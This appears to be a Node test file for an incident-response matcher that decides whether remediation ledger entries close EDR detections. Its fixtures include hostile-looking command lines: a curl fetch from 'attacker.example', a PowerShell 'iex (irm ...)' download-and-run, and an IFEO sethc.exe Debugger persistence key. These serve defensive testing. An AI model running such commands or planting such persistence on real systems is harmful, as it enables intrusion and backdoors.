#!/usr/bin/env node
// Tests for the IR ledger → detection matcher (lib/eyas-tools/ir/ledger-matcher.ts),
// ported from falcon-extras/ir/test_ledger_matcher.py.
//
// Every new remediation primitive needs three changes in lockstep:
//
//   1. a `kind ===` branch in lib/eyas-tools/ir/ledger-matcher.ts
//   2. a Phase 2 instruction in lib/eyas-tools/playbooks/ir.ts telling the
//      agent to emit that ledger entry on success
//   3. a unit test in this file exercising the new branch
//
// The tests below cover every kind currently registered. Add a test next to
// its sibling when introducing a new kind.
//
// Run as: node scripts/test-ir-ledger-matcher.mjs — re-spawns under tsx --test.

import { spawnSync } from "node:child_process";
import { fileURLToPath, pathToFileURL } from "node:url";
import path from "node:path";

const here = path.dirname(fileURLToPath(import.meta.url));
const root = path.resolve(here, "..");

if (!process.env.IR_LEDGER_CHILD) {
  const r = spawnSync(
    process.execPath,
    [process.cwd() + "/node_modules/tsx/dist/cli.mjs", "--test", path.join(here, "test-ir-ledger-matcher.mjs")],
    { cwd: root, stdio: "inherit", env: { ...process.env, IR_LEDGER_CHILD: "1" } },
  );
  process.exit(r.status ?? 1);
}

import { test } from "node:test";
import assert from "node:assert/strict";

const lm = await import(pathToFileURL(path.join(root, "lib/eyas-tools/ir/ledger-matcher.ts")).href);
const { ledgerEntryMatchesAlert } = lm;

const alertOf = (fields = {}) => ({ behaviors: [], ...fields });

// ---------------------------------------------------------------------------
// Host/network state changes never close a detection
// ---------------------------------------------------------------------------
// containment / lift / reboot are not per-detection remediation: isolating or
// rebooting a host doesn't remove the threat (persistence survives a reboot).
// A blanket "I contained the host" entry must NOT close the open-detection
// queue — otherwise the F2b release gate (which re-checks whether the Phase-0
// originals are still open) would be defeated by a routine containment.

test("host contained matches nothing", () => {
  const [m] = ledgerEntryMatchesAlert({ kind: "host_contained" }, alertOf());
  assert.equal(m, false);
});

test("host lifted matches nothing", () => {
  const [m] = ledgerEntryMatchesAlert({ kind: "host_lifted" }, alertOf());
  assert.equal(m, false);
});

test("host rebooted matches nothing", () => {
  const [m] = ledgerEntryMatchesAlert({ kind: "host_rebooted" }, alertOf());
  assert.equal(m, false);
});

test("host wide entry does not close alert with real evidence", () => {
  // Regression for the F2b-gate-defeat: even when the alert carries real
  // artifacts, a host-wide-style entry alone closes nothing — only a specific
  // per-artifact ledger entry does. (The matching process_killed entry is
  // ABSENT here, so the alert must stay open.)
  const alert = alertOf({
    process_id: "42",
    behaviors: [{ filename: "evil.exe", sha256: "e".repeat(64) }],
  });
  for (const kind of ["host_contained", "host_lifted", "host_rebooted"]) {
    const [m] = ledgerEntryMatchesAlert({ kind }, alert);
    assert.equal(m, false, `${kind} must not close a detection on its own`);
  }
});

// ---------------------------------------------------------------------------
// process_killed
// ---------------------------------------------------------------------------

test("process killed pid match", () => {
  const alert = alertOf({ process_id: "987654321" });
  const [m, r] = ledgerEntryMatchesAlert({ kind: "process_killed", pid: "987654321" }, alert);
  assert.equal(m, true);
  assert.match(r, /pid=987654321/);
});

test("process killed pid int vs string compares clean", () => {
  const alert = alertOf({ process_id: 987654321 });
  const [m] = ledgerEntryMatchesAlert({ kind: "process_killed", pid: "987654321" }, alert);
  assert.equal(m, true);
});

test("process killed image basename match", () => {
  // Matches against the alert's PROCESS IMAGE (behaviors[].filename /
  // filepath), not a string that merely appears in a command line.
  const alert = alertOf({
    behaviors: [{ filename: "evil.exe", filepath: String.raw`C:\Windows\System32\evil.exe` }],
  });
  const [m, r] = ledgerEntryMatchesAlert(
    { kind: "process_killed", pid: "111", image: String.raw`D:\Tools\evil.exe` },
    alert,
  );
  assert.equal(m, true);
  assert.match(r, /evil\.exe/);
});

test("process killed interpreter not matched by cmdline mention", () => {
  // Regression: a killed common interpreter (cmd.exe) must NOT close an
  // unrelated detection just because its cmdline mentions cmd.exe. Process
  // identity is pid + image only — no cmdline fallback for process_killed.
  const alert = alertOf({
    process_id: "555",
    cmdline: String.raw`C:\Windows\System32\cmd.exe /c whoami`,
    behaviors: [{ filename: "notepad.exe" }],
  });
  const [m] = ledgerEntryMatchesAlert({ kind: "process_killed", pid: "111", image: "cmd.exe" }, alert);
  assert.equal(m, false);
});

test("process killed no match returns false", () => {
  const alert = alertOf({ process_id: "123", behaviors: [{ filename: "benign.exe" }] });
  const [m] = ledgerEntryMatchesAlert({ kind: "process_killed", pid: "999", image: "evil.exe" }, alert);
  assert.equal(m, false);
});

// ---------------------------------------------------------------------------
// file_quarantined / file_deleted
// ---------------------------------------------------------------------------

test("file quarantined sha256 match", () => {
  const sha = "a".repeat(64);
  const alert = alertOf({ behaviors: [{ sha256: sha }] });
  const [m] = ledgerEntryMatchesAlert({ kind: "file_quarantined", sha256: sha.toUpperCase() }, alert);
  assert.equal(m, true);
});

test("file quarantined md5 match", () => {
  const md5 = "b".repeat(32);
  const alert = alertOf({ behaviors: [{ md5 }] });
  const [m] = ledgerEntryMatchesAlert({ kind: "file_deleted", md5 }, alert);
  assert.equal(m, true);
});

test("file quarantined path in cmdline", () => {
  const alert = alertOf({ cmdline: String.raw`powershell -c iex (irm C:\Temp\bad.zip)` });
  const [m] = ledgerEntryMatchesAlert({ kind: "file_quarantined", path: String.raw`C:\Temp\bad.zip` }, alert);
  assert.equal(m, true);
});

test("file quarantined basename in cmdline when path misses", () => {
  const alert = alertOf({ cmdline: "Expand-Archive bad.zip" });
  const [m, r] = ledgerEntryMatchesAlert({ kind: "file_quarantined", path: String.raw`D:\Stage\bad.zip` }, alert);
  assert.equal(m, true);
  assert.match(r, /filename=bad\.zip/);
});

test("file deleted short basename below floor no match", () => {
  // "a.exe" (5 chars) is below the bounded-token floor — a different file at
  // a different path must not close a detection just because the short
  // basename collides somewhere in the cmdline.
  const alert = alertOf({ cmdline: String.raw`running C:\Temp\a.exe now` });
  const [m] = ledgerEntryMatchesAlert({ kind: "file_deleted", path: String.raw`D:\Other\a.exe` }, alert);
  assert.equal(m, false);
});

// ---------------------------------------------------------------------------
// folder_deleted
// ---------------------------------------------------------------------------

test("folder deleted path in cmdline", () => {
  const alert = alertOf({ cmdline: String.raw`Expand-Archive -DestinationPath C:\extracted-tools` });
  const [m] = ledgerEntryMatchesAlert({ kind: "folder_deleted", path: String.raw`C:\extracted-tools` }, alert);
  assert.equal(m, true);
});

// ---------------------------------------------------------------------------
// registry_reverted / ifeo_removed
// ---------------------------------------------------------------------------

test("registry reverted matches behavior ioc value", () => {
  const p =
    String.raw`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion` +
    String.raw`\Image File Execution Options\sethc.exe\Debugger`;
  const alert = alertOf({ behaviors: [{ ioc_value: p }] });
  const [m] = ledgerEntryMatchesAlert({ kind: "registry_reverted", path: p }, alert);
  assert.equal(m, true);
});

test("registry reverted short ioc fragment does not match", () => {
  // Regression: the old bidirectional substring (`iv in path`) let a short,
  // generic behavior ioc_value fragment close a detection against a long,
  // specific ledger path. "run" appears inside the Run-key path but is not a
  // delimited match for the full path — must NOT close.
  const alert = alertOf({ behaviors: [{ ioc_value: "run" }] });
  const [m] = ledgerEntryMatchesAlert(
    {
      kind: "registry_reverted",
      path: String.raw`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EvilApp`,
    },
    alert,
  );
  assert.equal(m, false);
});

test("registry reverted prefix path does not overclose", () => {
  // Regression: "…\Run\EvilApp" must not close a detection about
  // "…\Run\EvilAppData" — bounded-token rejects the trailing-word-char
  // continuation that a bare `path in iv` substring would have matched.
  const alert = alertOf({
    behaviors: [{ ioc_value: String.raw`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EvilAppData` }],
  });
  const [m] = ledgerEntryMatchesAlert(
    {
      kind: "registry_reverted",
      path: String.raw`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EvilApp`,
    },
    alert,
  );
  assert.equal(m, false);
});

test("registry reverted embedded in quoted ioc value matches", () => {
  // The full path embedded in a larger ioc_value (quoted reg command) still
  // matches — the bounded token allows quote/space boundaries.
  const p = String.raw`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EvilApp`;
  const alert = alertOf({ behaviors: [{ ioc_value: `reg delete "${p}" /f` }] });
  const [m] = ledgerEntryMatchesAlert({ kind: "registry_reverted", path: p }, alert);
  assert.equal(m, true);
});

test("ifeo removed matches image in ioc value", () => {
  const alert = alertOf({
    behaviors: [
      {
        ioc_value:
          String.raw`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion` +
          String.raw`\Image File Execution Options\sethc.exe\Debugger`,
      },
    ],
  });
  const [m] = ledgerEntryMatchesAlert({ kind: "ifeo_removed", image: "sethc.exe" }, alert);
  assert.equal(m, true);
});

// ---------------------------------------------------------------------------
// ioa_pattern_excluded / ml_exclusion_added / ioc_added
// ---------------------------------------------------------------------------

test("ioa pattern excluded pattern id match", () => {
  const alert = alertOf({ behaviors: [{ pattern_id: 12345 }] });
  const [m] = ledgerEntryMatchesAlert({ kind: "ioa_pattern_excluded", pattern_id: "12345" }, alert);
  assert.equal(m, true);
});

test("ml exclusion added sha match", () => {
  const sha = "c".repeat(64);
  const alert = alertOf({ behaviors: [{ sha256: sha }] });
  const [m] = ledgerEntryMatchesAlert({ kind: "ml_exclusion_added", sha256: sha }, alert);
  assert.equal(m, true);
});

test("ioc added hash match", () => {
  const sha = "d".repeat(64);
  const alert = alertOf({ behaviors: [{ sha256: sha }] });
  const [m] = ledgerEntryMatchesAlert({ kind: "ioc_added", type: "sha256", value: sha }, alert);
  assert.equal(m, true);
});

test("ioc added domain substring match", () => {
  const alert = alertOf({ cmdline: "curl https://attacker.example/payload" });
  const [m] = ledgerEntryMatchesAlert({ kind: "ioc_added", type: "domain", value: "attacker.example" }, alert);
  assert.equal(m, true);
});

// ---------------------------------------------------------------------------
// rat_uninstalled / service / scheduled_task / wmi
// ---------------------------------------------------------------------------

test("rat uninstalled image basename match", () => {
  // Matches the binary by image basename (same discipline as process_killed).
  const alert = alertOf({
    behaviors: [{ filename: "AnyDesk.exe", filepath: String.raw`C:\Program Files\AnyDesk\AnyDesk.exe` }],
  });
  const [m] = ledgerEntryMatchesAlert({ kind: "rat_uninstalled", product: "AnyDesk", image: "AnyDesk.exe" }, alert);
  assert.equal(m, true);
});

test("rat uninstalled image token in cmdline match", () => {
  const alert = alertOf({ cmdline: String.raw`C:\Program Files\AnyDesk\AnyDesk.exe --service` });
  const [m] = ledgerEntryMatchesAlert({ kind: "rat_uninstalled", product: "AnyDesk", image: "AnyDesk.exe" }, alert);
  assert.equal(m, true);
});

test("rat uninstalled product only no match", () => {
  // The generic `product` substring was dropped — the bare product word in an
  // unrelated path must not close a detection without the binary image/token.
  const alert = alertOf({ cmdline: "echo installing AnyDeskHelper update" });
  const [m] = ledgerEntryMatchesAlert({ kind: "rat_uninstalled", product: "AnyDesk", image: "AnyDesk.exe" }, alert);
  assert.equal(m, false);
});

test("service removed name in cmdline", () => {
  const alert = alertOf({ cmdline: "sc start MaliciousSvc" });
  const [m] = ledgerEntryMatchesAlert({ kind: "service_removed", service_name: "MaliciousSvc" }, alert);
  assert.equal(m, true);
});

test("service removed bounded token not substring", () => {
  // "backup" (>=floor) appears INSIDE "backupperd" — delimited-token matching
  // must reject it; a bare substring `includes` check would have over-closed.
  const alert = alertOf({ cmdline: String.raw`C:\Tools\backupperd.exe run` });
  const [m] = ledgerEntryMatchesAlert({ kind: "service_removed", service_name: "backup" }, alert);
  assert.equal(m, false);
});

test("service removed short name below floor no match", () => {
  // 3-char service name "svc" is below the floor — must not substring-close.
  const alert = alertOf({ cmdline: "start svchost service manager" });
  const [m] = ledgerEntryMatchesAlert({ kind: "service_removed", service_name: "svc" }, alert);
  assert.equal(m, false);
});

test("wmi persistence removed filter name match", () => {
  const alert = alertOf({ behaviors: [{ ioc_value: "EventFilter:WeeklyImplantBeacon" }] });
  const [m] = ledgerEntryMatchesAlert(
    { kind: "wmi_persistence_removed", filter_name: "WeeklyImplantBeacon" },
    alert,
  );
  assert.equal(m, true);
});

test("wmi persistence short name below threshold no match", () => {
  // 3-char names are too generic — substring on "abc" would over-close.
  const alert = alertOf({ cmdline: "abc xyz" });
  const [m] = ledgerEntryMatchesAlert({ kind: "wmi_persistence_removed", filter_name: "abc" }, alert);
  assert.equal(m, false);
});

// ---------------------------------------------------------------------------
// Unknown / "other" never matches
// ---------------------------------------------------------------------------

test("other kind never matches", () => {
  const [m] = ledgerEntryMatchesAlert({ kind: "other", note: "operator did the thing" }, alertOf());
  assert.equal(m, false);
});

test("unknown kind never matches", () => {
  const [m] = ledgerEntryMatchesAlert({ kind: "magic_fix" }, alertOf());
  assert.equal(m, false);
});

test("empty kind never matches", () => {
  const [m] = ledgerEntryMatchesAlert({}, alertOf());
  assert.equal(m, false);
});
